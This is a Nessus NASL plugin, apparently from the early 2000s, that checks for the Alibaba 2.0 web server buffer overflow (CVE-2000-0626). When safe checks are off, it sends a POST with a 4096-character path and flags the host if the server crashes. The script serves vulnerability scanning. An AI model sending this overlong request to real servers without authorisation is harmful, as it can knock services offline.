#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10012);
 script_bugtraq_id(1482);
 script_cve_id("CVE-2000-0626");
 script_version ("$Revision: 1.25 $");

 name["english"] = "Alibaba 2.0 buffer overflow";
 name["francais"] = "Dépassement de buffer dans Alibaba 2.0";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "It is possible to make the remote web server execute
arbitrary commands by sending the following request:

	POST AA[...]AA/ HTTP/1.0
	
This problem may allow an attacker to execute arbitrary code on
the remote system or create a denial of service (DoS) attack.

Solution : At the time of this writing, no solution was available. 
Check with your vendor for a possible patch, or consider changing your
web server.

Risk factor : High";

 desc["francais"] = "Il est possible de faire executer du code arbitraire
à un serveur faisant tourner Alibaba 2.0 en lui envoyant la
commande suivante :

	POST AA[...]AAA/ HTTP/1.0
	
Ce problème peut permettre à un pirate d'executer du
code arbitraire sur le système distant, ou de mettre
le système hors-service.

Solution : Aucune. Utilisez un autre serveur web
Facteur de risque : Elevé";

 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Alibaba buffer overflow";
 summary["francais"] = "Dépassement de buffer dans Alibaba";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_MIXED_ATTACK); # mixed
 
 
 script_copyright(english:"This script is Copyright (C) 1999 Renaud Deraison",
		francais:"Ce script est Copyright (C) 1999 Renaud Deraison");
 family["english"] = "Gain root remotely";
 family["francais"] = "Passer root à distance";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "www_too_long_url.nasl");
 script_exclude_keys("www/too_long_url_crash");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("global_settings.inc");

port = get_http_port(default:80);

banner = get_http_banner(port: port);
 
if(!egrep(pattern:"^Server:.*[aA]libaba.*", string:banner)) exit(0);

if(safe_checks())
{
  if ( paranoia_level < 2 ) exit(0);
  alrt =  "It may be possible to make the remote Alibaba web server execute
arbitrary code by sending the following request :

	POST AA[...]AA/ HTTP/1.0
	
This problem may allow an attacker to execute arbitrary code on
the remote system or create a denial of service.

*** Nessus reports this vulnerability using only
*** information that was gathered. Use caution
*** when testing without safe checks enabled.

Solution : None at this time. Use another web server
Risk factor : High";
 
  security_hole(port:port, data:alrt);
  exit(0);
}
if(get_port_state(port))
{
 if(http_is_dead(port:port))exit(0);
 data = http_post(item:string(crap(4096),"/"), port:port); 
 soc = http_open_socket(port);
 if(soc > 0)
 {
  send(socket:soc, data:data);
  http_close_socket(soc);
  soc2 = http_open_socket(port);
  if(!soc2)security_hole(port);
  else http_close_socket(soc2);
 }
}
